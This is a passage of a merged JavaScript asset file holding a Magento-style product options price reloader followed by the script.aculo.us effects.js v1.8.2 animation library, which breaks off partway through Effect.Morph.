        var priceContainer = $(this.priceContainerId);
        if(priceContainer) {
            new Ajax.Updater(priceContainer, this.updatePriceUrl + '?ajax=1', {
                parameters:parameters
            });
        }
    }
}

/**************************** PRICE RELOADER ********************************/
Product.OptionsPrice = Class.create();
Product.OptionsPrice.prototype = {
    initialize: function(config) {
        this.productId          = config.productId;
        this.priceFormat        = config.priceFormat;
        this.includeTax         = config.includeTax;
        this.defaultTax         = config.defaultTax;
        this.currentTax         = config.currentTax;
        this.productPrice       = config.productPrice;
        this.showIncludeTax     = config.showIncludeTax;
        this.showBothPrices     = config.showBothPrices;
        this.productPrice       = config.productPrice;
        this.productOldPrice    = config.productOldPrice;
        this.skipCalculate      = config.skipCalculate;
        this.duplicateIdSuffix  = config.idSuffix;

        this.oldPlusDisposition = config.oldPlusDisposition;
        this.plusDisposition    = config.plusDisposition;

        this.oldMinusDisposition = config.oldMinusDisposition;
        this.minusDisposition    = config.minusDisposition;

        this.optionPrices = {};
        this.containers = {};

        this.displayZeroPrice   = true;

        this.initPrices();
    },

    setDuplicateIdSuffix: function(idSuffix) {
        this.duplicateIdSuffix = idSuffix;
    },

    initPrices: function() {
        this.containers[0] = 'product-price-' + this.productId;
        this.containers[1] = 'bundle-price-' + this.productId;
        this.containers[2] = 'price-including-tax-' + this.productId;
        this.containers[3] = 'price-excluding-tax-' + this.productId;
        this.containers[4] = 'old-price-' + this.productId;
    },

    changePrice: function(key, price) {
        this.optionPrices[key] = parseFloat(price);
    },

    getOptionPrices: function() {
        var result = 0;
        var nonTaxable = 0;
        $H(this.optionPrices).each(function(pair) {
            if (pair.key == 'nontaxable') {
                nonTaxable = pair.value;
            } else {
                result += pair.value;
            }
        });
        var r = new Array(result, nonTaxable);
        return r;
    },

    reload: function() {
        var price;
        var formattedPrice;
        var optionPrices = this.getOptionPrices();
        var nonTaxable = optionPrices[1];
        optionPrices = optionPrices[0];
        $H(this.containers).each(function(pair) {
            var _productPrice;
            var _plusDisposition;
            var _minusDisposition;
            if ($(pair.value)) {
                if (pair.value == 'old-price-'+this.productId && this.productOldPrice != this.productPrice) {
                    _productPrice = this.productOldPrice;
                    _plusDisposition = this.oldPlusDisposition;
                    _minusDisposition = this.oldMinusDisposition;
                } else {
                    _productPrice = this.productPrice;
                    _plusDisposition = this.plusDisposition;
                    _minusDisposition = this.minusDisposition;
                }

                var price = optionPrices+parseFloat(_productPrice)
                if (this.includeTax == 'true') {
                    // tax = tax included into product price by admin
                    var tax = price / (100 + this.defaultTax) * this.defaultTax;
                    var excl = price - tax;
                    var incl = excl*(1+(this.currentTax/100));
                } else {
                    var tax = price * (this.currentTax / 100);
                    var excl = price;
                    var incl = excl + tax;
                }

                excl += parseFloat(_plusDisposition);
                incl += parseFloat(_plusDisposition);
                excl -= parseFloat(_minusDisposition);
                incl -= parseFloat(_minusDisposition);

                //adding nontaxlable part of options
                excl += parseFloat(nonTaxable);
                incl += parseFloat(nonTaxable);

                if (pair.value == 'price-including-tax-'+this.productId) {
                    price = incl;
                } else if (pair.value == 'old-price-'+this.productId) {
                    if (this.showIncludeTax || this.showBothPrices) {
                        price = incl;
                    } else {
                        price = excl;
                    }
                } else {
                    if (this.showIncludeTax) {
                        price = incl;
                    } else {
                        if (!this.skipCalculate || _productPrice == 0) {
                            price = excl;
                        } else {
                            price = optionPrices+parseFloat(_productPrice);
                        }
                    }
                }

                if (price < 0) price = 0;

                if (price > 0 || this.displayZeroPrice) {
                    formattedPrice = this.formatPrice(price);
                } else {
                    formattedPrice = '';
                }

                if ($(pair.value).select('.price')[0]) {
                    $(pair.value).select('.price')[0].innerHTML = formattedPrice;
                    if ($(pair.value+this.duplicateIdSuffix) && $(pair.value+this.duplicateIdSuffix).select('.price')[0]) {
                        $(pair.value+this.duplicateIdSuffix).select('.price')[0].innerHTML = formattedPrice;
                    }
                } else {
                    $(pair.value).innerHTML = formattedPrice;
                    if ($(pair.value+this.duplicateIdSuffix)) {
                        $(pair.value+this.duplicateIdSuffix).innerHTML = formattedPrice;
                    }
                }
            };
        }.bind(this));
    },
    formatPrice: function(price) {
        return formatCurrency(price, this.priceFormat);
    }
}

// script.aculo.us effects.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
// Contributors:
//  Justin Palmer (http://encytemedia.com/)
//  Mark Pilgrim (http://diveintomark.org/)
//  Martin Bialasinki
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// converts rgb() and #xxx to #xxxxxx format,
// returns self (or first argument) if not convertable
String.prototype.parseColor = function() {
  var color = '#';
  if (this.slice(0,4) == 'rgb(') {
    var cols = this.slice(4,this.length-1).split(',');
    var i=0; do { color += parseInt(cols[i]).toColorPart() } while (++i<3);
  } else {
    if (this.slice(0,1) == '#') {
      if (this.length==4) for(var i=1;i<4;i++) color += (this.charAt(i) + this.charAt(i)).toLowerCase();
      if (this.length==7) color = this.toLowerCase();
    }
  }
  return (color.length==7 ? color : (arguments[0] || this));
};

/*--------------------------------------------------------------------------*/

Element.collectTextNodes = function(element) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType==3 ? node.nodeValue :
      (node.hasChildNodes() ? Element.collectTextNodes(node) : ''));
  }).flatten().join('');
};

Element.collectTextNodesIgnoreClass = function(element, className) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType==3 ? node.nodeValue :
      ((node.hasChildNodes() && !Element.hasClassName(node,className)) ?
        Element.collectTextNodesIgnoreClass(node, className) : ''));
  }).flatten().join('');
};

Element.setContentZoom = function(element, percent) {
  element = $(element);
  element.setStyle({fontSize: (percent/100) + 'em'});
  if (Prototype.Browser.WebKit) window.scrollBy(0,0);
  return element;
};

Element.getInlineOpacity = function(element){
  return $(element).style.opacity || '';
};

Element.forceRerendering = function(element) {
  try {
    element = $(element);
    var n = document.createTextNode(' ');
    element.appendChild(n);
    element.removeChild(n);
  } catch(e) { }
};

/*--------------------------------------------------------------------------*/

var Effect = {
  _elementDoesNotExistError: {
    name: 'ElementDoesNotExistError',
    message: 'The specified DOM element does not exist, but is required for this effect to operate'
  },
  Transitions: {
    linear: Prototype.K,
    sinoidal: function(pos) {
      return (-Math.cos(pos*Math.PI)/2) + .5;
    },
    reverse: function(pos) {
      return 1-pos;
    },
    flicker: function(pos) {
      var pos = ((-Math.cos(pos*Math.PI)/4) + .75) + Math.random()/4;
      return pos > 1 ? 1 : pos;
    },
    wobble: function(pos) {
      return (-Math.cos(pos*Math.PI*(9*pos))/2) + .5;
    },
    pulse: function(pos, pulses) {
      return (-Math.cos((pos*((pulses||5)-.5)*2)*Math.PI)/2) + .5;
    },
    spring: function(pos) {
      return 1 - (Math.cos(pos * 4.5 * Math.PI) * Math.exp(-pos * 6));
    },
    none: function(pos) {
      return 0;
    },
    full: function(pos) {
      return 1;
    }
  },
  DefaultOptions: {
    duration:   1.0,   // seconds
    fps:        100,   // 100= assume 66fps max.
    sync:       false, // true for combining
    from:       0.0,
    to:         1.0,
    delay:      0.0,
    queue:      'parallel'
  },
  tagifyText: function(element) {
    var tagifyStyle = 'position:relative';
    if (Prototype.Browser.IE) tagifyStyle += ';zoom:1';

    element = $(element);
    $A(element.childNodes).each( function(child) {
      if (child.nodeType==3) {
        child.nodeValue.toArray().each( function(character) {
          element.insertBefore(
            new Element('span', {style: tagifyStyle}).update(
              character == ' ' ? String.fromCharCode(160) : character),
              child);
        });
        Element.remove(child);
      }
    });
  },
  multiple: function(element, effect) {
    var elements;
    if (((typeof element == 'object') ||
        Object.isFunction(element)) &&
       (element.length))
      elements = element;
    else
      elements = $(element).childNodes;

    var options = Object.extend({
      speed: 0.1,
      delay: 0.0
    }, arguments[2] || { });
    var masterDelay = options.delay;

    $A(elements).each( function(element, index) {
      new effect(element, Object.extend(options, { delay: index * options.speed + masterDelay }));
    });
  },
  PAIRS: {
    'slide':  ['SlideDown','SlideUp'],
    'blind':  ['BlindDown','BlindUp'],
    'appear': ['Appear','Fade']
  },
  toggle: function(element, effect) {
    element = $(element);
    effect = (effect || 'appear').toLowerCase();
    var options = Object.extend({
      queue: { position:'end', scope:(element.id || 'global'), limit: 1 }
    }, arguments[2] || { });
    Effect[element.visible() ?
      Effect.PAIRS[effect][1] : Effect.PAIRS[effect][0]](element, options);
  }
};

Effect.DefaultOptions.transition = Effect.Transitions.sinoidal;

/* ------------- core effects ------------- */

Effect.ScopedQueue = Class.create(Enumerable, {
  initialize: function() {
    this.effects  = [];
    this.interval = null;
  },
  _each: function(iterator) {
    this.effects._each(iterator);
  },
  add: function(effect) {
    var timestamp = new Date().getTime();

    var position = Object.isString(effect.options.queue) ?
      effect.options.queue : effect.options.queue.position;

    switch(position) {
      case 'front':
        // move unstarted effects after this effect
        this.effects.findAll(function(e){ return e.state=='idle' }).each( function(e) {
            e.startOn  += effect.finishOn;
            e.finishOn += effect.finishOn;
          });
        break;
      case 'with-last':
        timestamp = this.effects.pluck('startOn').max() || timestamp;
        break;
      case 'end':
        // start effect after last queued effect has finished
        timestamp = this.effects.pluck('finishOn').max() || timestamp;
        break;
    }

    effect.startOn  += timestamp;
    effect.finishOn += timestamp;

    if (!effect.options.queue.limit || (this.effects.length < effect.options.queue.limit))
      this.effects.push(effect);

    if (!this.interval)
      this.interval = setInterval(this.loop.bind(this), 15);
  },
  remove: function(effect) {
    this.effects = this.effects.reject(function(e) { return e==effect });
    if (this.effects.length == 0) {
      clearInterval(this.interval);
      this.interval = null;
    }
  },
  loop: function() {
    var timePos = new Date().getTime();
    for(var i=0, len=this.effects.length;i<len;i++)
      this.effects[i] && this.effects[i].loop(timePos);
  }
});

Effect.Queues = {
  instances: $H(),
  get: function(queueName) {
    if (!Object.isString(queueName)) return queueName;

    return this.instances.get(queueName) ||
      this.instances.set(queueName, new Effect.ScopedQueue());
  }
};
Effect.Queue = Effect.Queues.get('global');

Effect.Base = Class.create({
  position: null,
  start: function(options) {
    function codeForEvent(options,eventName){
      return (
        (options[eventName+'Internal'] ? 'this.options.'+eventName+'Internal(this);' : '') +
        (options[eventName] ? 'this.options.'+eventName+'(this);' : '')
      );
    }
    if (options && options.transition === false) options.transition = Effect.Transitions.linear;
    this.options      = Object.extend(Object.extend({ },Effect.DefaultOptions), options || { });
    this.currentFrame = 0;
    this.state        = 'idle';
    this.startOn      = this.options.delay*1000;
    this.finishOn     = this.startOn+(this.options.duration*1000);
    this.fromToDelta  = this.options.to-this.options.from;
    this.totalTime    = this.finishOn-this.startOn;
    this.totalFrames  = this.options.fps*this.options.duration;

    this.render = (function() {
      function dispatch(effect, eventName) {
        if (effect.options[eventName + 'Internal'])
          effect.options[eventName + 'Internal'](effect);
        if (effect.options[eventName])
          effect.options[eventName](effect);
      }

      return function(pos) {
        if (this.state === "idle") {
          this.state = "running";
          dispatch(this, 'beforeSetup');
          if (this.setup) this.setup();
          dispatch(this, 'afterSetup');
        }
        if (this.state === "running") {
          pos = (this.options.transition(pos) * this.fromToDelta) + this.options.from;
          this.position = pos;
          dispatch(this, 'beforeUpdate');
          if (this.update) this.update(pos);
          dispatch(this, 'afterUpdate');
        }
      };
    })();

    this.event('beforeStart');
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).add(this);
  },
  loop: function(timePos) {
    if (timePos >= this.startOn) {
      if (timePos >= this.finishOn) {
        this.render(1.0);
        this.cancel();
        this.event('beforeFinish');
        if (this.finish) this.finish();
        this.event('afterFinish');
        return;
      }
      var pos   = (timePos - this.startOn) / this.totalTime,
          frame = (pos * this.totalFrames).round();
      if (frame > this.currentFrame) {
        this.render(pos);
        this.currentFrame = frame;
      }
    }
  },
  cancel: function() {
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).remove(this);
    this.state = 'finished';
  },
  event: function(eventName) {
    if (this.options[eventName + 'Internal']) this.options[eventName + 'Internal'](this);
    if (this.options[eventName]) this.options[eventName](this);
  },
  inspect: function() {
    var data = $H();
    for(property in this)
      if (!Object.isFunction(this[property])) data.set(property, this[property]);
    return '#<Effect:' + data.inspect() + ',options:' + $H(this.options).inspect() + '>';
  }
});

Effect.Parallel = Class.create(Effect.Base, {
  initialize: function(effects) {
    this.effects = effects || [];
    this.start(arguments[1]);
  },
  update: function(position) {
    this.effects.invoke('render', position);
  },
  finish: function(position) {
    this.effects.each( function(effect) {
      effect.render(1.0);
      effect.cancel();
      effect.event('beforeFinish');
      if (effect.finish) effect.finish(position);
      effect.event('afterFinish');
    });
  }
});

Effect.Tween = Class.create(Effect.Base, {
  initialize: function(object, from, to) {
    object = Object.isString(object) ? $(object) : object;
    var args = $A(arguments), method = args.last(),
      options = args.length == 5 ? args[3] : null;
    this.method = Object.isFunction(method) ? method.bind(object) :
      Object.isFunction(object[method]) ? object[method].bind(object) :
      function(value) { object[method] = value };
    this.start(Object.extend({ from: from, to: to }, options || { }));
  },
  update: function(position) {
    this.method(position);
  }
});

Effect.Event = Class.create(Effect.Base, {
  initialize: function() {
    this.start(Object.extend({ duration: 0 }, arguments[0] || { }));
  },
  update: Prototype.emptyFunction
});

Effect.Opacity = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    // make this work on IE on elements without 'layout'
    if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
      this.element.setStyle({zoom: 1});
    var options = Object.extend({
      from: this.element.getOpacity() || 0.0,
      to:   1.0
    }, arguments[1] || { });
    this.start(options);
  },
  update: function(position) {
    this.element.setOpacity(position);
  }
});

Effect.Move = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      x:    0,
      y:    0,
      mode: 'relative'
    }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    this.element.makePositioned();
    this.originalLeft = parseFloat(this.element.getStyle('left') || '0');
    this.originalTop  = parseFloat(this.element.getStyle('top')  || '0');
    if (this.options.mode == 'absolute') {
      this.options.x = this.options.x - this.originalLeft;
      this.options.y = this.options.y - this.originalTop;
    }
  },
  update: function(position) {
    this.element.setStyle({
      left: (this.options.x  * position + this.originalLeft).round() + 'px',
      top:  (this.options.y  * position + this.originalTop).round()  + 'px'
    });
  }
});

// for backwards compatibility
Effect.MoveBy = function(element, toTop, toLeft) {
  return new Effect.Move(element,
    Object.extend({ x: toLeft, y: toTop }, arguments[3] || { }));
};

Effect.Scale = Class.create(Effect.Base, {
  initialize: function(element, percent) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      scaleX: true,
      scaleY: true,
      scaleContent: true,
      scaleFromCenter: false,
      scaleMode: 'box',        // 'box' or 'contents' or { } with provided values
      scaleFrom: 100.0,
      scaleTo:   percent
    }, arguments[2] || { });
    this.start(options);
  },
  setup: function() {
    this.restoreAfterFinish = this.options.restoreAfterFinish || false;
    this.elementPositioning = this.element.getStyle('position');

    this.originalStyle = { };
    ['top','left','width','height','fontSize'].each( function(k) {
      this.originalStyle[k] = this.element.style[k];
    }.bind(this));

    this.originalTop  = this.element.offsetTop;
    this.originalLeft = this.element.offsetLeft;

    var fontSize = this.element.getStyle('font-size') || '100%';
    ['em','px','%','pt'].each( function(fontSizeType) {
      if (fontSize.indexOf(fontSizeType)>0) {
        this.fontSize     = parseFloat(fontSize);
        this.fontSizeType = fontSizeType;
      }
    }.bind(this));

    this.factor = (this.options.scaleTo - this.options.scaleFrom)/100;

    this.dims = null;
    if (this.options.scaleMode=='box')
      this.dims = [this.element.offsetHeight, this.element.offsetWidth];
    if (/^content/.test(this.options.scaleMode))
      this.dims = [this.element.scrollHeight, this.element.scrollWidth];
    if (!this.dims)
      this.dims = [this.options.scaleMode.originalHeight,
                   this.options.scaleMode.originalWidth];
  },
  update: function(position) {
    var currentScale = (this.options.scaleFrom/100.0) + (this.factor * position);
    if (this.options.scaleContent && this.fontSize)
      this.element.setStyle({fontSize: this.fontSize * currentScale + this.fontSizeType });
    this.setDimensions(this.dims[0] * currentScale, this.dims[1] * currentScale);
  },
  finish: function(position) {
    if (this.restoreAfterFinish) this.element.setStyle(this.originalStyle);
  },
  setDimensions: function(height, width) {
    var d = { };
    if (this.options.scaleX) d.width = width.round() + 'px';
    if (this.options.scaleY) d.height = height.round() + 'px';
    if (this.options.scaleFromCenter) {
      var topd  = (height - this.dims[0])/2;
      var leftd = (width  - this.dims[1])/2;
      if (this.elementPositioning == 'absolute') {
        if (this.options.scaleY) d.top = this.originalTop-topd + 'px';
        if (this.options.scaleX) d.left = this.originalLeft-leftd + 'px';
      } else {
        if (this.options.scaleY) d.top = -topd + 'px';
        if (this.options.scaleX) d.left = -leftd + 'px';
      }
    }
    this.element.setStyle(d);
  }
});

Effect.Highlight = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({ startcolor: '#ffff99' }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    // Prevent executing on elements not in the layout flow
    if (this.element.getStyle('display')=='none') { this.cancel(); return; }
    // Disable background image during the effect
    this.oldStyle = { };
    if (!this.options.keepBackgroundImage) {
      this.oldStyle.backgroundImage = this.element.getStyle('background-image');
      this.element.setStyle({backgroundImage: 'none'});
    }
    if (!this.options.endcolor)
      this.options.endcolor = this.element.getStyle('background-color').parseColor('#ffffff');
    if (!this.options.restorecolor)
      this.options.restorecolor = this.element.getStyle('background-color');
    // init color calculations
    this._base  = $R(0,2).map(function(i){ return parseInt(this.options.startcolor.slice(i*2+1,i*2+3),16) }.bind(this));
    this._delta = $R(0,2).map(function(i){ return parseInt(this.options.endcolor.slice(i*2+1,i*2+3),16)-this._base[i] }.bind(this));
  },
  update: function(position) {
    this.element.setStyle({backgroundColor: $R(0,2).inject('#',function(m,v,i){
      return m+((this._base[i]+(this._delta[i]*position)).round().toColorPart()); }.bind(this)) });
  },
  finish: function() {
    this.element.setStyle(Object.extend(this.oldStyle, {
      backgroundColor: this.options.restorecolor
    }));
  }
});

Effect.ScrollTo = function(element) {
  var options = arguments[1] || { },
  scrollOffsets = document.viewport.getScrollOffsets(),
  elementOffsets = $(element).cumulativeOffset();

  if (options.offset) elementOffsets[1] += options.offset;

  return new Effect.Tween(null,
    scrollOffsets.top,
    elementOffsets[1],
    options,
    function(p){ scrollTo(scrollOffsets.left, p.round()); }
  );
};

/* ------------- combination effects ------------- */

Effect.Fade = function(element) {
  element = $(element);
  var oldOpacity = element.getInlineOpacity();
  var options = Object.extend({
    from: element.getOpacity() || 1.0,
    to:   0.0,
    afterFinishInternal: function(effect) {
      if (effect.options.to!=0) return;
      effect.element.hide().setStyle({opacity: oldOpacity});
    }
  }, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Appear = function(element) {
  element = $(element);
  var options = Object.extend({
  from: (element.getStyle('display') == 'none' ? 0.0 : element.getOpacity() || 0.0),
  to:   1.0,
  // force Safari to render floated elements properly
  afterFinishInternal: function(effect) {
    effect.element.forceRerendering();
  },
  beforeSetup: function(effect) {
    effect.element.setOpacity(effect.options.from).show();
  }}, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Puff = function(element) {
  element = $(element);
  var oldStyle = {
    opacity: element.getInlineOpacity(),
    position: element.getStyle('position'),
    top:  element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height
  };
  return new Effect.Parallel(
   [ new Effect.Scale(element, 200,
      { sync: true, scaleFromCenter: true, scaleContent: true, restoreAfterFinish: true }),
     new Effect.Opacity(element, { sync: true, to: 0.0 } ) ],
     Object.extend({ duration: 1.0,
      beforeSetupInternal: function(effect) {
        Position.absolutize(effect.effects[0].element);
      },
      afterFinishInternal: function(effect) {
         effect.effects[0].element.hide().setStyle(oldStyle); }
     }, arguments[1] || { })
   );
};

Effect.BlindUp = function(element) {
  element = $(element);
  element.makeClipping();
  return new Effect.Scale(element, 0,
    Object.extend({ scaleContent: false,
      scaleX: false,
      restoreAfterFinish: true,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping();
      }
    }, arguments[1] || { })
  );
};

Effect.BlindDown = function(element) {
  element = $(element);
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: 0,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping();
    }
  }, arguments[1] || { }));
};

Effect.SwitchOff = function(element) {
  element = $(element);
  var oldOpacity = element.getInlineOpacity();
  return new Effect.Appear(element, Object.extend({
    duration: 0.4,
    from: 0,
    transition: Effect.Transitions.flicker,
    afterFinishInternal: function(effect) {
      new Effect.Scale(effect.element, 1, {
        duration: 0.3, scaleFromCenter: true,
        scaleX: false, scaleContent: false, restoreAfterFinish: true,
        beforeSetup: function(effect) {
          effect.element.makePositioned().makeClipping();
        },
        afterFinishInternal: function(effect) {
          effect.element.hide().undoClipping().undoPositioned().setStyle({opacity: oldOpacity});
        }
      });
    }
  }, arguments[1] || { }));
};

Effect.DropOut = function(element) {
  element = $(element);
  var oldStyle = {
    top: element.getStyle('top'),
    left: element.getStyle('left'),
    opacity: element.getInlineOpacity() };
  return new Effect.Parallel(
    [ new Effect.Move(element, {x: 0, y: 100, sync: true }),
      new Effect.Opacity(element, { sync: true, to: 0.0 }) ],
    Object.extend(
      { duration: 0.5,
        beforeSetup: function(effect) {
          effect.effects[0].element.makePositioned();
        },
        afterFinishInternal: function(effect) {
          effect.effects[0].element.hide().undoPositioned().setStyle(oldStyle);
        }
      }, arguments[1] || { }));
};

Effect.Shake = function(element) {
  element = $(element);
  var options = Object.extend({
    distance: 20,
    duration: 0.5
  }, arguments[1] || {});
  var distance = parseFloat(options.distance);
  var split = parseFloat(options.duration) / 10.0;
  var oldStyle = {
    top: element.getStyle('top'),
    left: element.getStyle('left') };
    return new Effect.Move(element,
      { x:  distance, y: 0, duration: split, afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance, y: 0, duration: split, afterFinishInternal: function(effect) {
        effect.element.undoPositioned().setStyle(oldStyle);
  }}); }}); }}); }}); }}); }});
};

Effect.SlideDown = function(element) {
  element = $(element).cleanWhitespace();
  // SlideDown need to have the content of the element wrapped in a container element with fixed height!
  var oldInnerBottom = element.down().getStyle('bottom');
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: window.opera ? 0 : 1,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBottom}); }
    }, arguments[1] || { })
  );
};

Effect.SlideUp = function(element) {
  element = $(element).cleanWhitespace();
  var oldInnerBottom = element.down().getStyle('bottom');
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, window.opera ? 0 : 1,
   Object.extend({ scaleContent: false,
    scaleX: false,
    scaleMode: 'box',
    scaleFrom: 100,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBottom});
    }
   }, arguments[1] || { })
  );
};

// Bug in opera makes the TD containing this element expand for a instance after finish
Effect.Squish = function(element) {
  return new Effect.Scale(element, window.opera ? 1 : 0, {
    restoreAfterFinish: true,
    beforeSetup: function(effect) {
      effect.element.makeClipping();
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping();
    }
  });
};

Effect.Grow = function(element) {
  element = $(element);
  var options = Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.full
  }, arguments[1] || { });
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims = element.getDimensions();
  var initialMoveX, initialMoveY;
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      initialMoveX = initialMoveY = moveX = moveY = 0;
      break;
    case 'top-right':
      initialMoveX = dims.width;
      initialMoveY = moveY = 0;
      moveX = -dims.width;
      break;
    case 'bottom-left':
      initialMoveX = moveX = 0;
      initialMoveY = dims.height;
      moveY = -dims.height;
      break;
    case 'bottom-right':
      initialMoveX = dims.width;
      initialMoveY = dims.height;
      moveX = -dims.width;
      moveY = -dims.height;
      break;
    case 'center':
      initialMoveX = dims.width / 2;
      initialMoveY = dims.height / 2;
      moveX = -dims.width / 2;
      moveY = -dims.height / 2;
      break;
  }

  return new Effect.Move(element, {
    x: initialMoveX,
    y: initialMoveY,
    duration: 0.01,
    beforeSetup: function(effect) {
      effect.element.hide().makeClipping().makePositioned();
    },
    afterFinishInternal: function(effect) {
      new Effect.Parallel(
        [ new Effect.Opacity(effect.element, { sync: true, to: 1.0, from: 0.0, transition: options.opacityTransition }),
          new Effect.Move(effect.element, { x: moveX, y: moveY, sync: true, transition: options.moveTransition }),
          new Effect.Scale(effect.element, 100, {
            scaleMode: { originalHeight: dims.height, originalWidth: dims.width },
            sync: true, scaleFrom: window.opera ? 1 : 0, transition: options.scaleTransition, restoreAfterFinish: true})
        ], Object.extend({
             beforeSetup: function(effect) {
               effect.effects[0].element.setStyle({height: '0px'}).show();
             },
             afterFinishInternal: function(effect) {
               effect.effects[0].element.undoClipping().undoPositioned().setStyle(oldStyle);
             }
           }, options)
      );
    }
  });
};

Effect.Shrink = function(element) {
  element = $(element);
  var options = Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.none
  }, arguments[1] || { });
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims = element.getDimensions();
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      moveX = moveY = 0;
      break;
    case 'top-right':
      moveX = dims.width;
      moveY = 0;
      break;
    case 'bottom-left':
      moveX = 0;
      moveY = dims.height;
      break;
    case 'bottom-right':
      moveX = dims.width;
      moveY = dims.height;
      break;
    case 'center':
      moveX = dims.width / 2;
      moveY = dims.height / 2;
      break;
  }

  return new Effect.Parallel(
    [ new Effect.Opacity(element, { sync: true, to: 0.0, from: 1.0, transition: options.opacityTransition }),
      new Effect.Scale(element, window.opera ? 1 : 0, { sync: true, transition: options.scaleTransition, restoreAfterFinish: true}),
      new Effect.Move(element, { x: moveX, y: moveY, sync: true, transition: options.moveTransition })
    ], Object.extend({
         beforeStartInternal: function(effect) {
           effect.effects[0].element.makePositioned().makeClipping();
         },
         afterFinishInternal: function(effect) {
           effect.effects[0].element.hide().undoClipping().undoPositioned().setStyle(oldStyle); }
       }, options)
  );
};

Effect.Pulsate = function(element) {
  element = $(element);
  var options    = arguments[1] || { },
    oldOpacity = element.getInlineOpacity(),
    transition = options.transition || Effect.Transitions.linear,
    reverser   = function(pos){
      return 1 - transition((-Math.cos((pos*(options.pulses||5)*2)*Math.PI)/2) + .5);
    };

  return new Effect.Opacity(element,
    Object.extend(Object.extend({  duration: 2.0, from: 0,
      afterFinishInternal: function(effect) { effect.element.setStyle({opacity: oldOpacity}); }
    }, options), {transition: reverser}));
};

Effect.Fold = function(element) {
  element = $(element);
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height };
  element.makeClipping();
  return new Effect.Scale(element, 5, Object.extend({
    scaleContent: false,
    scaleX: false,
    afterFinishInternal: function(effect) {
    new Effect.Scale(element, 1, {
      scaleContent: false,
      scaleY: false,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping().setStyle(oldStyle);
      } });
  }}, arguments[1] || { }));
};

Effect.Morph = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      style: { }
    }, arguments[1] || { });

    if (!Object.isString(options.style)) this.style = $H(options.style);
    else {
      if (options.style.include(':'))
        this.style = options.style.parseStyle();
      else {
        this.element.addClassName(options.style);
        this.style = $H(this.element.getStyles());
        this.element.removeClassName(options.style);
